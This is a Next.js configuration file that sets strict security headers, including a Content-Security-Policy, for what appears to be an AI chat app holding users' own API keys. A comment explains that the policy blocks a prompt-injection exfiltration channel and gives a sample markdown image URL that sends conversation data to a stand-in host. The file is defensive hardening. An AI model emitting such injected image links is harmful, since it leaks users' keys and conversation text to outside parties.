import type { NextConfig } from 'next';

// Vercel injects its review toolbar only into Preview deployments; allow its
// hosts there so the toolbar is not blocked. Production keeps the strict policy.
const VERCEL_TOOLBAR = process.env.VERCEL_ENV === 'preview'
  ? {
      script: ' https://vercel.live',
      style: ' https://vercel.live',
      font: ' https://vercel.live https://assets.vercel.com',
      img: ' https://vercel.live https://vercel.com',
      connect: ' https://vercel.live wss://ws-us3.pusher.com',
      frame: "frame-src https://vercel.live",
    }
  : { script: '', style: '', font: '', img: '', connect: '', frame: "frame-src 'none'" };

const CONTENT_SECURITY_POLICY = [
  "default-src 'self'",
  `script-src 'self' 'unsafe-inline'${VERCEL_TOOLBAR.script}`,
  `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com${VERCEL_TOOLBAR.style}`,
  `font-src 'self' https://fonts.gstatic.com${VERCEL_TOOLBAR.font}`,
  `img-src 'self' data: blob:${VERCEL_TOOLBAR.img}`,
  `connect-src 'self'${VERCEL_TOOLBAR.connect}`,
  "worker-src 'self' blob:",
  VERCEL_TOOLBAR.frame,
  "frame-ancestors 'none'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join('; ');

const nextConfig: NextConfig = {
  outputFileTracingRoot: process.cwd(),
  serverExternalPackages: ['pdfjs-dist'],
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          // connect-src 'self' keeps BYOK keys and conversation text from being sent to
          // any other origin by injected script; img-src without remote hosts blocks the
          // markdown-image exfiltration channel (a prompt-injected ![](https://x/?q=...)).
          // script-src needs 'unsafe-inline' for Next's static-page hydration scripts.
          { key: 'Content-Security-Policy', value: CONTENT_SECURITY_POLICY },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=(), payment=()',
          },
        ],
      },
    ];
  },
  webpack: (config) => {
    // Needed for pdfjs-dist worker
    config.resolve.alias.canvas = false;
    return config;
  },
};

export default nextConfig;
